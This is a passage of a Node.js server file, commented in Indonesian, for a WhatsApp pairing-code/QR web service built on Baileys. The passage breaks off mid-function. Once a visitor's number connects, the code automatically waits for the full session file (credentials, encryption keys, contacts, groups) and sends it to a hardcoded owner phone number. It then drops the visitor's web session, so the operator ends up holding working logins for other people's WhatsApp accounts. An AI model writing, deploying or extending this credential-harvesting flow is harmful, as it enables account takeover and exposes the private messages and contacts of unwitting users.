/**
 * SessionBot — index.js (build baru dari 0, 26 Nov 2026)
 * Web pairing code / QR code WhatsApp (Baileys latest), pola resmi V1
 * dari ReadSwEsm_V1 (github.com/Wilykun/ReadSwEsm_V1).
 *
 * Alur:
 *  1. fetchLatestBaileysVersion() fallback [2,3000,1043857760], timeout 8 detik.
 *  2. Browser v1 = Ubuntu + Chrome (Browsers.ubuntu('Chrome')). JANGAN iPhone
 *     (v12): WhatsApp menolak pairing code untuk profil iPhone.
 *  3. makeWASocket V1 (logger pino silent, printQRInTerminal false).
 *  4. Pairing / QR HANYA bila !state.creds.registered.
 *  5. GATE pairing (browserSwitch.js V1): tunggu sock.ws?.isOpen (BUKAN
 *     readyState), delay ~5 detik setelah connect. Belum open -> jangan request.
 *  6. Retry requestPairingCode max 3x. Error 'Connection Closed' / 408:
 *     reset flag pairingRequested supaya socket berikutnya bisa coba lagi.
 *  7. Kode pairing berlaku 3 MENIT (180 detik). QR berlaku 60 detik.
 *  8. sock.ev.on('creds.update', saveCreds) selalu dipasang.
 *  9. connection.update: open -> connected; close loggedOut/401 ->
 *     hapus sesi, status invalid, minta pairing ulang.
 *     QR dari event connection.update ({ qr }) -> qrcode.toDataURL.
 * 10. Sesi per nomor (pola jadibot V1, BUKAN satu file untuk semua):
 *     sessions/<nomor>/hisoka.json — SATU file JSON berisi SEMUA
 *     { creds, keys, contacts, groups, settings } (useSingleFileAuthState,
 *     pola V1 BOT_SESSION_NAME=hisoka). Tiap nomor punya folder sendiri,
 *     jadi banyak orang bisa pairing bersamaan tanpa bentrok (tanpa 409).
 *     Backup: hisoka.json.good + hisoka.json.bak (pulih live -> .good -> .bak).
 *     JANGAN PERNAH share file sesi — isinya kredensial WhatsApp.
 * 11. Validasi nomor + deteksi region: src/phone.js (libphonenumber-js).
 *     Server TIDAK PERNAH percaya validasi client — selalu validasi ulang.
 * 12. KIRIM SESI KE OWNER (pola SEMUA_FITUR/jadibot/credsjson.js):
 *     Setelah connection 'open', JANGAN langsung kirim — tunggu
 *     hisoka.json MAKSIMAL dulu (polling 1,5 detik, max 40 detik,
 *     syarat: registered + me + pre-key>=5 + session>=1 +
 *     identity-key>=1 + ukuran >10 KB + ukuran stabil 2x berurutan).
 *     Lalu cek owner terdaftar di WA (onWhatsApp), kirim dokumen
 *     hisoka.json ke +6289688206739 (ownerNumber, SATU-SATUNYA tujuan),
 *     simpan marker sessions/<nomor>/hisoka.delivered.json, lalu TUTUP
 *     socket + putuskan sesi WEB nomor itu (status delivered_disconnected).
 *     File sessions/<nomor>/hisoka.json (+ .good/.bak) TETAP di disk —
 *     yang terputus hanya koneksi web/socket nomor itu, bukan file sesinya.
 *     Jangan kirim ke nomor bot itu sendiri / nomor dari input web.
 *
 * PENTING: kode pairing HANYA dari sock.requestPairingCode() asli dan
 * QR HANYA dari event Baileys asli. Server ini TIDAK PERNAH membuat /
 * menebak kode atau QR sendiri.
 */
import express from 'express'
import http from 'node:http'
import { WebSocketServer } from 'ws'
import { readFile, writeFile, copyFile, rm, mkdir } from 'node:fs/promises'
import { existsSync, readFileSync, writeFileSync, mkdirSync } from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import { fileURLToPath } from 'node:url'
import pino from 'pino'
import QRCode from 'qrcode'
import makeWASocket, {
  DisconnectReason,
  fetchLatestBaileysVersion
} from '@whiskeysockets/baileys'
import { useSingleFileAuthState } from './src/authState.js'
import { getBrowserDevice, getBrowserLabel } from './src/browserDevice.js'
import { validatePhone, detectRegionFull } from './src/phone.js'
import { getWhatsAppProxyAgent } from './src/proxyAgent.js'

const __filename = fileURLToPath(import.meta.url)
const __dirname = path.dirname(__filename)
const ROOT = __dirname
const SESSIONS_DIR = path.join(ROOT, 'sessions')
// Nama file sesi V1: hisoka.json (BOT_SESSION_NAME=hisoka), satu file per nomor.
const SESSION_NAME = process.env.BOT_SESSION_NAME || 'hisoka'
const SESSION_FILE_NAME = `${SESSION_NAME}.json`
function sessionDirFor(phone) {
  const dir = String(phone || '').replace(/[^0-9]/g, '')
  if (!/^[0-9]{10,15}$/.test(dir)) throw new Error('Nomor tidak valid untuk path sesi')
  return path.join(SESSIONS_DIR, dir)
}
function sessionFileFor(phone) { return path.join(sessionDirFor(phone), SESSION_FILE_NAME) }
function deliveredFileFor(phone) { return path.join(sessionDirFor(phone), `${SESSION_NAME}.delivered.json`) }
const PUBLIC_DIR = path.join(ROOT, 'public')
const CONFIG_PATH = path.join(ROOT, 'config.json')

const PORT = Number(process.env.PORT || 3000)
const CODE_TTL_SECONDS = 180 // kode pairing berlaku 3 menit (V1)
const QR_TTL_SECONDS = 60 // QR berlaku 60 detik, lalu Baileys terbitkan yang baru
const FALLBACK_VERSION = [2, 3000, 1043857760]
// Pengiriman sesi: polling 1,5 detik, max 40 detik (pola credsjson.js V1).
const DELIVERY_POLL_MS = 1500
const DELIVERY_MAX_WAIT_MS = 40000
const DELIVERY_MIN_SIZE_BYTES = 10000
const DELIVERY_MIN_PREKEYS = 5

const delay = (ms) => new Promise((r) => setTimeout(r, ms))

// ---------- config ----------
let config = {
  botVersion: 'V27.1',
  browserDevice: { selected: 'v1' },
  pairedBrowserKey: 'v1',
  pairingCode: '',
  sessionName: 'hisoka',
  ownerNumber: '6289688206739',
  sendSessionToOwner: true
}
try {
  const raw = await readFile(CONFIG_PATH, 'utf-8')
  config = { ...config, ...JSON.parse(raw) }
} catch (err) {
  console.warn('[SessionBot] config.json tidak terbaca, pakai default:', err.message)
}

// Nomor owner — HANYA dari config/env, TIDAK PERNAH dari input web.
const OWNER_NUMBER = String(process.env.OWNER_NUMBER || config.ownerNumber || '6289688206739').replace(/[^0-9]/g, '')
const OWNER_JID = `${OWNER_NUMBER}@s.whatsapp.net`
const SEND_SESSION_TO_OWNER = process.env.SEND_SESSION_TO_OWNER
  ? process.env.SEND_SESSION_TO_OWNER !== 'false'
  : config.sendSessionToOwner !== false

// Format WIB (Asia/Jakarta) ala credsjson.js V1: "Kamis, 26 Nov 2026", "12:30 WIB".
function formatWib(date = new Date()) {
  const wib = new Date(date.toLocaleString('en-US', { timeZone: 'Asia/Jakarta' }))
  const days = ['Minggu', 'Senin', 'Selasa', 'Rabu', 'Kamis', 'Jumat', 'Sabtu']
  const months = ['Jan', 'Feb', 'Mar', 'Apr', 'Mei', 'Jun', 'Jul', 'Agu', 'Sep', 'Okt', 'Nov', 'Des']
  const tgl = `${days[wib.getDay()]}, ${wib.getDate()} ${months[wib.getMonth()]} ${wib.getFullYear()}`
  const jam = `${String(wib.getHours()).padStart(2, '0')}:${String(wib.getMinutes()).padStart(2, '0')} WIB`
  return { tgl, jam, iso: date.toISOString() }
}

function normalizeCustomCode(raw) {
  // Normalisasi kode custom pola V1 (index.js V1):
  // uppercase, buang selain A-Z0-9, maksimal 8 karakter.
  return String(raw || '').toUpperCase().replace(/[^A-Z0-9]/g, '').slice(0, 8)
}
// codeMode 'custom' -> normalisasi pola V1 lalu KURANGNYA DIISI '0' DI BELAKANG
// (V1: .slice(0, 8).padEnd(8, '0')). UI memberi pratinjau kode jadinya
// (XXXX-XXXX) saat kurang dari 8, jadi user tahu persis kode yang akan terbit.
// codeMode 'random' (atau kosong) -> undefined = Baileys buat kode acak.
// Tanpa codeMode dari web: pakai config.json (V1), kosong = acak.
function resolvePairingCode(codeMode, customCode) {
  if (codeMode === 'random') return { code: undefined }
  if (codeMode === 'custom') {
    const raw = normalizeCustomCode(customCode)
    if (!raw) return { error: 'Kode custom masih kosong — isi dulu 1–8 karakter (A–Z, 0–9), atau pilih Acak.' }
    const code = raw.padEnd(8, '0')
    return { code, padded: 8 - raw.length }
  }
  if (!config.pairingCode) return { code: undefined }
  return { code: normalizeCustomCode(config.pairingCode).padEnd(8, '0') }
}

function formatPairingCode(code) {
  return code?.match(/.{1,4}/g)?.join('-') || code
}

function clearExpireTimer(entry) {
  if (entry.expireTimer) { clearTimeout(entry.expireTimer); entry.expireTimer = null }
}

function startExpireTimer(entry, phone, seconds, onExpire) {
  clearExpireTimer(entry)
  entry.expiresAt = Date.now() + seconds * 1000
  entry.expireTimer = setTimeout(() => {
    onExpire()
    broadcastStatus(phone)
  }, seconds * 1000)
}

// ---------- state per nomor ----------
/**
 * sessions: Map<phone, {
 *   sock, state, saveCreds, status, method, code, qrDataUrl, expiresAt,
 *   pairingRequested, expireTimer, botNumber, region
 * }>
 * status: idle | connecting | awaiting_code | awaiting_qr | connected |
 *   delivering | delivered_disconnected | delivery_failed | invalid | expired
 *   delivering = sesi sudah terhubung, menunggu maksimal + mengirim ke owner.
 *   delivered_disconnected = hisoka.json nomor itu SUDAH terkirim ke owner,
 *   lalu socket web nomor itu ditutup — file sessions/<nomor>/hisoka.json
 *   TETAP di disk.
 */
const sessions = new Map()

// Catatan pengiriman yang sudah selesai (tetap tampil di web walau socket
// sudah ditutup): Map<phone, { phone, status:'delivered_disconnected',
// delivery, botNumber, method, region }>
const deliveredByPhone = new Map()

// ---------- WebSocket broadcast ----------
const wsClients = new Set()
function broadcast(payload) {
  const text = JSON.stringify(payload)
  for (const ws of wsClients) {
    try { if (ws.readyState === 1) ws.send(text) } catch {}
  }
}
function broadcastStatus(phone) {
  const s = sessions.get(phone)
  if (s) {
    broadcast({
      type: 'status',
      phone,
      status: s.status,
      method: s.method || 'pairing',
      code: s.status === 'awaiting_code' ? s.code : null,
      qrDataUrl: s.status === 'awaiting_qr' ? s.qrDataUrl : null,
      expiresIn: s.expiresAt ? Math.max(0, Math.ceil((s.expiresAt - Date.now()) / 1000)) : 0,
      botNumber: s.botNumber || null,
      region: s.region || detectRegionFull(phone),
      browser: getBrowserLabel(config),
      delivery: s.delivery || null,
      deliveryError: s.deliveryError || null,
      session: s.sessionChecklist || null
    })
    return
  }
  // Sesi live sudah ditutup setelah terkirim — siarkan catatan delivered-nya.
  const d = deliveredByPhone.get(phone)
  if (d) {
    broadcast({
      type: 'status',
      phone,
      status: 'delivered_disconnected',
      method: d.method || 'pairing',
      code: null,
      qrDataUrl: null,
      expiresIn: 0,
      botNumber: d.botNumber || null,
      region: d.region || detectRegionFull(phone),
      browser: getBrowserLabel(config),
      delivery: d.delivery || null,
      deliveryError: null,
      session: d.sessionChecklist || null
    })
  }
}

// ---------- backup sesi ----------
async function backupSessionFile(filePath) {
  try {
    if (!existsSync(filePath)) return
    const good = filePath + '.good'
    const bak = filePath + '.bak'
    if (existsSync(good)) { try { await copyFile(good, bak) } catch {} }
    await copyFile(filePath, good)
  } catch (err) {
    console.warn('[SessionBot] Gagal backup sesi:', err.message)
  }
}

async function deleteSessionFiles(phone) {
  // Hapus HANYA folder nomor itu (hisoka.json + .good + .bak + .tmp +
  // marker pengiriman) — folder nomor lain TIDAK disentuh.
  // Dipanggil HANYA dari logout / 401 — TIDAK PERNAH setelah kirim ke owner.
  try {
    await rm(sessionDirFor(phone), { recursive: true, force: true })
  } catch {}
  deliveredByPhone.delete(phone)
}

// ---------- kirim hisoka.json nomor itu ke owner (pola credsjson.js V1) ----------
// Marker: sessions/<nomor>/hisoka.delivered.json — bukti kirim, tanpa isi file.
async function readDeliveryMarker(phone) {
  try {
    const raw = await readFile(deliveredFileFor(phone), 'utf-8')
    const m = JSON.parse(raw)
    if (m && m.owner === OWNER_NUMBER && m.phone) return m
  } catch {}
  return null
}
async function writeDeliveryMarker(phone, marker) {
  try {
    await mkdir(sessionDirFor(phone), { recursive: true })
    await writeFile(deliveredFileFor(phone), JSON.stringify(marker, null, 2))
  } catch (err) {
    console.warn('[SessionBot] Gagal tulis marker delivered:', err.message)
  }
}

// Info hisoka.json nomor itu TANPA membocorkan kunci rahasia: hanya status,
// nomor/nama tertaut, ukuran file, dan jumlah keys/contacts/groups.
async function getSessionInfo(phone) {
  const sessionFile = sessionFileFor(phone)
  const info = {
    phone,
    sessionName: SESSION_FILE_NAME,
    file: `sessions/${phone}/${SESSION_FILE_NAME}`,
    exists: existsSync(sessionFile),
    hasGoodBackup: existsSync(sessionFile + '.good'),
    hasBakBackup: existsSync(sessionFile + '.bak'),
    registered: false, me: null, sizeBytes: 0,
    keyCounts: {}, contactsCount: 0, groupsCount: 0
  }
  if (!info.exists) return info
  try {
    const { stat } = await import('node:fs/promises')
    info.sizeBytes = (await stat(sessionFile)).size
    const raw = await readFile(sessionFile, 'utf-8')
    const data = JSON.parse(raw)
    info.registered = data?.creds?.registered === true
    if (data?.creds?.me) {
      info.me = {
        id: data.creds.me.id || null,
        lid: data.creds.me.lid || null,
        name: data.creds.me.name || null,
        number: typeof data.creds.me.id === 'string' ? data.creds.me.id.split(':')[0]?.split('@')[0] : null
      }
    }
    for (const [k, v] of Object.entries(data?.keys || {})) info.keyCounts[k] = Object.keys(v || {}).length
    info.contactsCount = Object.keys(data?.contacts || {}).length
    info.groupsCount = Object.keys(data?.groups || {}).length
  } catch {}
  return info
}

// Metadata AMAN dari hisoka.json nomor itu — hanya jumlah/ukuran/flag,
// TIDAK PERNAH isi kunci. Dipakai checklist pengiriman di web (data asli).
function sessionChecklist(info) {
  const kc = info.keyCounts || {}
  return {
    exists: !!info.exists,
    registered: !!info.registered,
    me: info.me && info.me.id ? info.me.id : null,
    preKeys: kc['pre-key'] || 0,
    sessions: kc['session'] || 0,
    identityKeys: kc['identity-key'] || 0,
    sizeBytes: info.sizeBytes || 0
  }
}

// Tunggu hisoka.json nomor itu MAKSIMAL (credsjson.js: waitUntilPrekeys —
// polling 1,5 detik, max 40 detik). Kriteria maksimal: registered + me +
// pre-key>=5 + session>=1 + identity-key>=1 + ukuran >10 KB + ukuran
// STABIL pada 2 cek berurutan. Timeout tapi registered + pre-key>=1 ->
// lanjut dengan peringatan. File kosong / keys 0 -> TOLAK, jangan kirim.
async function waitUntilSessionComplete(phone, timeoutMs = DELIVERY_MAX_WAIT_MS) {
  const deadline = Date.now() + timeoutMs
  let prevSize = null
  let prevAt = 0
  let lastInfo = await getSessionInfo(phone)
  while (Date.now() < deadline) {
    const info = await getSessionInfo(phone)
    lastInfo = info
    const kc = info.keyCounts || {}
    const ready = info.registered
      && info.me?.id && info.me?.number
      && (kc['pre-key'] || 0) >= DELIVERY_MIN_PREKEYS
      && (kc['session'] || 0) >= 1
      && (kc['identity-key'] || 0) >= 1
      && info.sizeBytes > DELIVERY_MIN_SIZE_BYTES
    if (ready) {
      // Ukuran stabil? Bandingkan dengan cek sebelumnya (jeda >=1,5 detik).
      if (prevSize !== null && prevSize === info.sizeBytes && Date.now() - prevAt >= DELIVERY_POLL_MS) {
        return { ok: true, complete: true, info }
      }
      if (prevSize === null || prevSize !== info.sizeBytes) {
        prevSize = info.sizeBytes
        prevAt = Date.now()
      }
    } else {
      prevSize = null
    }
    await delay(DELIVERY_POLL_MS)
  }
  const info = lastInfo
  const kc = info.keyCounts || {}
  // File kosong / tidak ada keys -> TOLAK, jangan kirim.
  if (!info.exists || info.sizeBytes <= 0 || Object.values(kc).reduce((a, b) => a + b, 0) === 0) {
    return { ok: false, complete: false, info, reason: `${SESSION_FILE_NAME} belum lengkap (file kosong / tidak ada keys) — tidak dikirim.` }
  }
  // Timeout tapi sudah registered dan ada pre-key -> lanjut dengan peringatan.
  if (info.registered && (kc['pre-key'] || 0) >= 1) {
    console.warn('[SessionBot] Sesi belum 100% maksimal setelah 40 detik (pre-key '
      + (kc['pre-key'] || 0) + ' < 5) — tetap kirim dengan peringatan.')
    return { ok: true, complete: false, warning: `Sesi dikirim sebelum 100% maksimal (pre-key < 5 setelah 40 detik).`, info }
  }
  return { ok: false, complete: false, info, reason: `${SESSION_FILE_NAME} belum maksimal setelah 40 detik (belum registered / pre-key kurang) — tidak dikirim.` }
}

function buildDeliveryCaption(phone, sizeBytes) {
  const { tgl, jam } = formatWib()
  const kb = (sizeBytes / 1024).toFixed(1)
  return `╔══════════════════════╗\n║  🤖  *S E S S I O N*  ║\n╚══════════════════════╝\n\n`
    + `📂 *File* : ${SESSION_FILE_NAME}\n📱 *Bot*  : +${phone}\n📅 *Tgl*  : ${tgl}\n⏰ *Jam*  : ${jam}\n📦 *Ukuran*: ${kb} KB\n\n━━━━━━━━━━━━━━━━━━━━━\n\n`
    + `✅ *Session bot berhasil terhubung!*\n\nFile ${SESSION_FILE_NAME} ini berisi SEMUA data sesi\n(creds + keys + contacts + groups + settings).\nSimpan baik-baik — file ini dipakai bot utama\ntanpa perlu pairing ulang.\n\n`
    + `━━━━━━━━━━━━━━━━━━━━━\n\n⚠️ *RAHASIA!*\n_Jangan bagikan file ini_\n_kepada siapapun!_`
}

// Kirim hisoka.json nomor itu ke owner. Dipanggil OTOMATIS setelah
// connection 'open' dan manual via POST /api/session/send-to-owner.
// Mengembalikan hasil; TIDAK PERNAH melempar (semua gagal ditangkap
// jadi {ok:false}). Setelah terkirim sukses: socket ditutup + sesi web
// nomor itu terputus (delivered_disconnected), TAPI hisoka.json/.good/.bak
// nomor itu TETAP di disk.
async function deliverSessionToOwner(sock, phone, opts = {}) {
  const entry = sessions.get(phone)
  const liveSock = sock || entry?.sock
  if (!entry || !liveSock) {
    return { ok: false, error: 'Bot belum terhubung — pairing dulu sebelum kirim sesi ke owner.' }
  }
  if (!SEND_SESSION_TO_OWNER) {
    return { ok: false, error: 'Pengiriman sesi ke owner dimatikan di config (sendSessionToOwner=false).' }
  }
  if (entry.delivering) {
    return { ok: false, error: 'Pengiriman sesi sedang berjalan — tunggu sebentar.' }
  }
  const force = opts.force === true

  // Jangan kirim ulang otomatis bila marker sudah cocok dengan file saat ini.
  const marker = await readDeliveryMarker(phone)
  const current = await getSessionInfo(phone)
  entry.sessionChecklist = sessionChecklist(current)
  if (!force && marker && marker.phone === phone && marker.sizeBytes === current.sizeBytes && current.sizeBytes > 0) {
    entry.delivery = marker
    entry.deliverySkipped = true
    console.log(`[SessionBot] ${SESSION_FILE_NAME} sudah terkirim ke +${OWNER_NUMBER} (ukuran sama, ${current.sizeBytes} byte) — tidak kirim ulang.`)
    return { ok: true, alreadyDelivered: true, delivery: marker }
  }

  entry.delivering = true
  entry.deliveryError = null
  entry.status = 'delivering'
  broadcastStatus(phone)
  console.log(`[SessionBot] Menunggu ${SESSION_FILE_NAME} maksimal sebelum kirim ke +${OWNER_NUMBER}…`)

  try {
    // (a) Flush + backup dulu, supaya yang dibaca adalah file terbaru.
    try { if (entry.flushImmediate) await entry.flushImmediate() } catch {}
    await backupSessionFile(sessionFileFor(phone))

    // (b) Tunggu sesi MAKSIMAL (max 40 detik).
    const waited = await waitUntilSessionComplete(phone)
    if (!waited.ok) {
      entry.delivering = false
      entry.status = 'delivery_failed'
      entry.deliveryError = waited.reason
      console.warn('[SessionBot] Gagal kirim sesi:', waited.reason)
      broadcastStatus(phone)
      return { ok: false, status: 'delivery_failed', error: waited.reason }
    }
    const info = waited.info
    entry.sessionChecklist = sessionChecklist(info)

    // (c) Cek owner terdaftar di WA dulu (pola credsjson.js: onWhatsApp).
    let ownerExists = false
    try {
      const res = await liveSock.onWhatsApp(OWNER_JID)
      ownerExists = Array.isArray(res) && res.length > 0 && res[0]?.exists === true
    } catch (err) {
      console.warn('[SessionBot] onWhatsApp owner gagal:', err.message)
    }
    if (!ownerExists) {
      entry.delivering = false
      entry.status = 'delivery_failed'
      entry.deliveryError = `Nomor owner +${OWNER_NUMBER} tidak terdaftar di WhatsApp — sesi TIDAK dikirim, sesi web tetap terhubung.`
      console.warn('[SessionBot] ' + entry.deliveryError)
      broadcastStatus(phone)
      return { ok: false, status: 'delivery_failed', error: entry.deliveryError }
    }

    // (d) Baca file + kirim dokumen — tujuan SELALU owner, bukan nomor bot / input web.
    const buf = await readFile(sessionFileFor(phone))
    if (!buf || buf.length <= 0) {
      entry.delivering = false
      entry.status = 'delivery_failed'
      entry.deliveryError = `${SESSION_FILE_NAME} kosong — tidak dikirim.`
      broadcastStatus(phone)
      return { ok: false, status: 'delivery_failed', error: entry.deliveryError }
    }
    const caption = buildDeliveryCaption(phone, buf.length)
    const sent = await liveSock.sendMessage(OWNER_JID, {
      document: buf,
      mimetype: 'application/json',
      fileName: SESSION_FILE_NAME,
      caption
    })
    const { tgl, jam, iso } = formatWib()
    const delivery = {
      phone,
      number: phone,
      owner: OWNER_NUMBER,
      sizeBytes: buf.length,
      sentAt: iso,
      sentAtWib: `${tgl} ${jam}`,
      messageId: sent?.key?.id || null,
      warning: waited.warning || null
    }
    await writeDeliveryMarker(phone, delivery)
    entry.delivery = delivery
    entry.delivering = false
    entry.status = 'delivered'
    console.log(`[SessionBot] ${SESSION_FILE_NAME} terkirim ke +${OWNER_NUMBER} (${buf.length} byte, msg ${delivery.messageId || '-'}) — menutup socket web.`)
    broadcastStatus(phone)

    // (f) Setelah terkirim: TUTUP socket + putuskan sesi WEB.
    //     hisoka.json (+ .good/.bak) TIDAK dihapus — tetap di disk.
    await disconnectAfterDelivery(phone)
    return { ok: true, status: 'delivered_disconnected', delivery }
  } catch (err) {
    entry.delivering = false
    entry.status = 'delivery_failed'
    entry.deliveryError = `Gagal mengirim ${SESSION_FILE_NAME} ke owner: ${err?.message || err} — sesi web tetap terhubung, coba kirim ulang.`
    console.error('[SessionBot] ' + entry.deliveryError)
    broadcastStatus(phone)
    return { ok: false, status: 'delivery_failed', error: entry.deliveryError }
  }
}

// Tutup socket + hapus entry in-memory setelah terkirim, tapi simpan
// catatan delivered agar web tetap menampilkan "Terkirim ✓".
// TIDAK menghapus hisoka.json / .good / .bak — file sesi tetap di disk.
async function disconnectAfterDelivery(phone) {
  const entry = sessions.get(phone)
  if (!entry) return
  clearExpireTimer(entry)
  const delivery = entry.delivery || null
  const botNumber = entry.botNumber || null
  const method = entry.method || 'pairing'
  const region = entry.region || detectRegionFull(phone)
  try { entry.sock?.ev?.removeAllListeners() } catch {}
  try { entry.sock?.ws?.close() } catch {}
  sessions.delete(phone)
  deliveredByPhone.set(phone, {
    phone, status: 'delivered_disconnected', delivery, botNumber, method, region,
    sessionChecklist: entry.sessionChecklist || null
  })
  broadcast({
    type: 'status',
    phone,
    status: 'delivered_disconnected',
    method,
    code: null,
    qrDataUrl: null,
    expiresIn: 0,
    botNumber,
    region,
    browser: getBrowserLabel(config),
    delivery,
    deliveryError: null,
    session: entry.sessionChecklist || null
  })
}

// ---------- Baileys version (fallback + timeout 8 detik, pola V1) ----------
async function getBaileysVersion() {
  const controller = new AbortController()
  const fetchP = fetchLatestBaileysVersion({ signal: controller.signal }).catch((error) => ({
    version: FALLBACK_VERSION, isLatest: false, error
  }))
  const timeoutP = new Promise((resolve) => setTimeout(() => resolve({
    version: FALLBACK_VERSION, isLatest: false, timedOut: true
  }), 8000))
  const result = await Promise.race([fetchP, timeoutP])
  controller.abort()
  if (result?.timedOut) console.warn('[SessionBot] Version check timeout 8 detik; pakai fallback', FALLBACK_VERSION)
  else if (result?.error) console.warn('[SessionBot] Version check gagal; pakai fallback:', result.error?.message || result.error)
  return Array.isArray(result?.version) ? result.version : FALLBACK_VERSION
}

// ---------- buat socket + pairing code / QR ----------
// codeOptions: { codeMode: 'custom'|'random'|undefined, code: string|undefined }
//   codeMode 'custom' -> code sudah dinormalisasi + dipad '0' jadi 8 karakter
//   di route (aturan V1), diteruskan apa adanya ke Baileys sehingga kode
//   terbit = kode keinginan (yang kurang diisi 0, sesuai pratinjau di UI).
//   codeMode 'random' / tanpa code -> undefined = Baileys buat kode acak.
async function createSocketAndPair(phone, method = 'pairing', codeOptions = {}) {
  const sessionDir = sessionDirFor(phone)
  await mkdir(sessionDir, { recursive: true })
  // File sesi per nomor: sessions/<nomor>/hisoka.json — tiap nomor punya
  // folder sendiri, jadi tidak ada konflik antar nomor (tanpa penolakan 409).
  const sessionFile = sessionFileFor(phone)
  const { state, saveCreds, flushImmediate } = await useSingleFileAuthState(sessionFile)

  const entry = sessions.get(phone) || {}
  entry.phone = phone
  entry.method = method
  entry.codeMode = codeOptions.codeMode || null
  entry.pairingCode = codeOptions.code // string 8 karakter, atau undefined = acak
  entry.state = state
  entry.saveCreds = saveCreds
  entry.flushImmediate = flushImmediate
  entry.status = 'connecting'
  entry.code = null
  entry.qrDataUrl = null
  entry.expiresAt = null
  entry.pairingRequested = false
  entry.botNumber = entry.botNumber || null
  entry.region = detectRegionFull(phone)
  sessions.set(phone, entry)

  // Sudah tertaut (hisoka.json registered)? Jangan minta kode / QR baru —
  // tapi socket tetap dibuat: begitu 'open', kirim hisoka.json ke owner
  // bila belum pernah terkirim / file berubah (lihat handler 'open').
  const alreadyRegistered = Boolean(state.creds?.registered)
  if (alreadyRegistered) {
    entry.status = 'connected'
    entry.botNumber = state.creds.me?.id?.split(':')[0]?.split('@')[0] || phone
    broadcastStatus(phone)
  }

  const version = await getBaileysVersion()
  const logger = pino({ level: 'silent' })

  const sock = makeWASocket({
    version,
    // Agen proxy CONNECT (src/proxyAgent.js, dari panel WEB_JADIBOT):
    // tanpa ini socket mati 408 — egress langsung VM diblokir, WebSocket
    // Baileys HARUS lewat proxy. Tanpa proxy (PC/VPS) -> undefined.
    agent: getWhatsAppProxyAgent(),
    logger,
    auth: { creds: state.creds, keys: state.keys },
    browser: getBrowserDevice(config),
    printQRInTerminal: false,
    connectTimeoutMs: 60000,
    defaultQueryTimeoutMs: 60000,
    keepAliveIntervalMs: 25000,
    retryRequestDelayMs: 2000,
    maxMsgRetryCount: 5
  })
  entry.sock = sock

  // creds.update SELALU dipasang (V1) + backup .good/.bak saat tersimpan.
  sock.ev.on('creds.update', async (update) => {
    try {
      saveCreds(update)
      // Beri waktu flush debounce 300 ms, lalu backup file yang sudah tersimpan.
      setTimeout(() => backupSessionFile(sessionFile).catch(() => {}), 400)
    } catch (err) {
      console.error('[SessionBot] creds.update gagal:', err.message)
    }
  })

  sock.ev.on('connection.update', async (update) => {
    const { connection, lastDisconnect, qr } = update

    // ── QR ASLI dari Baileys (hanya mode qr, hanya bila belum registered) ──
    if (qr && method === 'qr' && !state.creds?.registered && entry.status !== 'connected') {
      try {
        const dataUrl = await QRCode.toDataURL(qr, { margin: 1, width: 512 })
        entry.qrDataUrl = dataUrl
        entry.status = 'awaiting_qr'
        startExpireTimer(entry, phone, QR_TTL_SECONDS, () => {
          if (entry.status === 'awaiting_qr') {
            entry.status = 'expired'
            entry.qrDataUrl = null
            entry.expiresAt = null
            console.log(`[SessionBot] QR ${phone} kadaluarsa (${QR_TTL_SECONDS} detik)`)
          }
        })
        console.log(`[SessionBot] QR terbit untuk ${phone} (berlaku ${QR_TTL_SECONDS} detik)`)
        broadcastStatus(phone)
      } catch (err) {
        console.error('[SessionBot] Gagal membuat QR data URL:', err.message)
      }
    }

    if (connection === 'open') {
      entry.status = 'connected'
      entry.code = null
      entry.qrDataUrl = null
      entry.expiresAt = null
      clearExpireTimer(entry)
      entry.botNumber = sock.user?.id?.split(':')[0]?.split('@')[0] || phone
      // V1: pastikan registered = true tersimpan PERMANEN setelah terhubung —
      // hisoka.json jadi lengkap: creds + keys + contacts + groups + settings,
      // siap dipakai restart tanpa pairing ulang.
      try { if (state.creds) state.creds.registered = true } catch {}
      try { await flushImmediate() } catch {}
      await backupSessionFile(sessionFile)
      try { entry.sessionChecklist = sessionChecklist(await getSessionInfo(phone)) } catch {}
      console.log(`[SessionBot] ${phone} terhubung sebagai ${entry.botNumber} — ${SESSION_FILE_NAME} tersimpan lengkap`)
      broadcastStatus(phone)
      // Kirim hisoka.json ke owner OTOMATIS — async, jangan blokir status
      // 'connected': status berubah delivering -> delivered ->
      // delivered_disconnected. Guard anti-kirim-2x ada di dalam fungsi.
      if (SEND_SESSION_TO_OWNER) {
        deliverSessionToOwner(sock, phone).catch((e) => {
          console.error('[SessionBot] deliverSessionToOwner gagal:', e?.message || e)
        })
      }
    } else if (connection === 'close') {
      const statusCode = lastDisconnect?.error?.output?.statusCode
      const reason = lastDisconnect?.error?.output?.payload?.error
      if (statusCode === 401 || reason === 'loggedOut' || lastDisconnect?.error?.message?.includes('logged out')) {
        entry.status = 'invalid'
        entry.code = null
        entry.qrDataUrl = null
        entry.expiresAt = null
        clearExpireTimer(entry)
        await deleteSessionFiles(phone)
        console.warn(`[SessionBot] ${phone} logout (401) — sesi dihapus, minta pairing ulang`)
        broadcastStatus(phone)
      }
    }
  })

  // ── Sudah tertaut: tunggu socket 'open' (max ~30 detik), lalu biarkan
  //    pengiriman ke owner berjalan (handler 'open' memicunya async).
  //    Kalau marker sudah cocok -> status tetap 'connected' (tidak kirim ulang).
  if (alreadyRegistered) {
    for (let i = 0; i < 60; i++) {
      if (entry.status === 'delivered_disconnected') {
        return { ok: true, status: 'delivered_disconnected', method, botNumber: entry.botNumber, region: entry.region, delivery: entry.delivery || (await readDeliveryMarker(phone)) }
      }
      if (entry.status === 'delivery_failed') {
        return { ok: false, status: 'delivery_failed', method, botNumber: entry.botNumber, region: entry.region, error: entry.deliveryError || 'Gagal mengirim sesi ke owner.' }
      }
      if (entry.status === 'connected' && entry.deliverySkipped) {
        return { ok: true, alreadyConnected: true, status: 'connected', botNumber: entry.botNumber, region: entry.region, delivery: entry.delivery || null, note: 'Nomor ini sudah tertaut dan sesi sudah terkirim ke owner.' }
      }
      await delay(500)
    }
    return { ok: true, alreadyConnected: true, status: entry.status, method, botNumber: entry.botNumber, region: entry.region, note: 'Nomor ini sudah tertaut.' }
  }

  // ── Mode QR: tunggu QR pertama terbit (max ~15 detik), lalu balas. ──
  if (method === 'qr') {
    for (let i = 0; i < 30; i++) {
      if (entry.status === 'delivered_disconnected') {
        return { ok: true, status: 'delivered_disconnected', method: 'qr', botNumber: entry.botNumber, region: entry.region, delivery: entry.delivery || (await readDeliveryMarker(phone)) }
      }
      if (entry.status === 'delivery_failed') {
